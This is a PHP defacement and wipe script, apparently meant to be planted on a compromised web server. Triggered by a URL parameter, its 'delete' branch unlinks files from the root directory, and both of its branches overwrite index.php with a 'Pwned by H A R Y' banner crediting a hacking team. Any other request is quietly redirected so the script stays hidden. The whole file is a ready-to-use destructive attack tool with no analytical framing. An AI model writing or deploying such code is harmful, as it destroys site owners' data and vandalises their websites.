 <?php 
ob_start();
  if($_GET['action']=="delete"){

//error_reporting(0);
//if(isset($_GET['action'])){
 // if($_GET['action']=="delete"){

  $folder_path = "/";


$files = glob($folder_path.'/*');

foreach($files as $file) {

  //if(is_file($file))
   
    unlink($file);

$files = fopen("index.php","w");
echo fwrite($files,"    <html>
    <head>
    <link rel='shortcut icon' href='https://haryit.github.io/logo.png'>
    <link rel='icon' href='https://haryit.github.io/logo.png'>
    <title>Pwned by H A R Y</title>
    <style>
     html, body { background-color: white; ; color: #636b6f; font-family: 'Fredericka the Great', sans-serif; font-weight: 100; height: 100vh; margin: 0; } .full-height { height: 100vh; } .flex-center { align-items: center; display: flex; justify-content: center; } .position-ref { position: relative; } .content { text-align: center; } .title { font-size: 36px; padding: 20px; }
    </style>

         
    </head>
    <body align='center' oncontextmenu='return false' bgcolor='black'>
    <div class='error'>
        <script type='text/javascript'> 
        </script>
        <div class='flex-center position-ref full-height'>
            <div class='content'>
                <center>
                <img src='https://media.tenor.com/images/f38a60fe4557787213f7bf64ed248ca0/tenor.gif' width='300'><br>
                <font color='black'><code><font size='5'><i><br>
                Touched by H A R Y<br>
                Thanks to: <br>
                <marquee class='hary' width='30%'>Mr.Cyber - Mr.N17 - Mr.N3T - and all member</marquee><br>
                <div><iframe width='300' height='60' src='https://vocaroo.com/embed/1dQIrXQMdcUL?autoplay=0' frameborder='0' allow='autoplay'></iframe></div>
                <font style='font-size:15'>Contact me : theofaninatasia@gmail.com</font><br>Copyright &copy; Ghost N3T T3am 2023</div>
            <div style='display:none'>
                
            
            </body>
            </html>");
fclose($files);

}
}












 else if ($_GET['action'] == 'lock') {


$files = fopen("index.php","w");
echo fwrite($files,"    <html>
    <head>
    <link rel='shortcut icon' href='https://haryit.github.io/logo.png'>
    <link rel='icon' href='https://haryit.github.io/logo.png'>
    <title>Pwned by H A R Y</title>
    <style>
     html, body { background-color: white; ; color: #636b6f; font-family: 'Fredericka the Great', sans-serif; font-weight: 100; height: 100vh; margin: 0; } .full-height { height: 100vh; } .flex-center { align-items: center; display: flex; justify-content: center; } .position-ref { position: relative; } .content { text-align: center; } .title { font-size: 36px; padding: 20px; }
    </style>

         
    </head>
    <body align='center' oncontextmenu='return false' bgcolor='black'>
    <div class='error'>
        <script type='text/javascript'> 
        </script>
        <div class='flex-center position-ref full-height'>
            <div class='content'>
                <center>
                <img src='https://media.tenor.com/images/f38a60fe4557787213f7bf64ed248ca0/tenor.gif' width='300'><br>
                <font color='black'><code><font size='5'><i><br>
                Touched by H A R Y<br>
                Thanks to: <br>
                <marquee class='hary' width='30%'>Mr.Cyber - Mr.N17 - Mr.N3T - and all member</marquee><br>
                <div><iframe width='300' height='60' src='https://vocaroo.com/embed/1dQIrXQMdcUL?autoplay=0' frameborder='0' allow='autoplay'></iframe></div>
                <font style='font-size:15'>Contact me : theofaninatasia@gmail.com</font><br>Copyright &copy; Ghost N3T T3am 2023</div>
            <div style='display:none'>
                
            
            </body>
            </html>");
fclose($files);



}


 else{
  echo " <meta http-equiv='refresh' content='0;url=/'>
";


 }

?>
